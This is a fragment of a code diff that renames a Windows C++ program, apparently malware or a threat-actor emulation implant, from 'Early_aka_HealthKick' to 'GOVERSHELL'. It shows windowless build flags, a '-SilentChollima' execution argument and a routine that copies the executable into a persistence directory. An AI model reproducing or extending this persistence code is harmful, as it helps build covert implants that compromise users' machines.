@@ -1,6 +1,6 @@
-// Compile: x86_64-w64-mingw32-g++ -std=c++17 -o  Early_aka_HealthKick.exe  Early_aka_HealthKick.cpp -static -lwinhttp -lws2_32 -lgdi32 -mwindows -lole32 -loleaut32
+// Compile: x86_64-w64-mingw32-g++ -std=c++17 -o  GOVERSHELL.exe  GOVERSHELL.cpp -static -lwinhttp -lws2_32 -lgdi32 -mwindows -lole32 -loleaut32
 
-// Execution: Early_aka_HealthKick.exe -SilentChollima
+// Execution: GOVERSHELL -SilentChollima
 
 #include <windows.h>
 #include <winhttp.h>
@@ -127,7 +127,7 @@ bool create_persistence_dir() {
 }
 
 bool copy_to_persistence() {
-    full_exe_path = persist_dir + "\\ Early_aka_HealthKick.exe";
+    full_exe_path = persist_dir + "\\ GOVERSHELL";
     std::ifstream src(get_module_path(), std::ios::binary);
     if (!src) return false;
     std::ofstream dst(full_exe_path, std::ios::binary);
